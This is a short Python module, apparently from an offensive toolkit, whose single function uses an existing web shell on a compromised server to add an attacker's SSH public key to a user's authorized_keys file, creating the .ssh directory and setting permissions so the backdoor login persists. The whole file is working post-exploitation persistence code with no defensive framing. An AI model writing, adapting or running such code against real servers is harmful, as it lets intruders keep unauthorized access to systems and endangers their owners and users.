# Python 3.11 · ssh-key persistence via existing shell
from __future__ import annotations


async def persist_ssh(client, shell_url: str, pubkey: str, user: str = "www-data") -> bool:
    from .webshell import shell_exec
    home = "/root" if user == "root" else f"/home/{user}"
    path = f"{home}/.ssh/authorized_keys"
    check = await shell_exec(client, shell_url, f"grep -qF '{pubkey[:40]}' {path} 2>/dev/null && echo yes")
    if "yes" in check:
        return True
    cmd = (
        f"mkdir -p {home}/.ssh && chmod 700 {home}/.ssh && "
        f"echo '{pubkey}' >> {path} && chmod 600 {path} && "
        f"chown -R {user}:{user} {home}/.ssh"
    )
    await shell_exec(client, shell_url, cmd)
    return True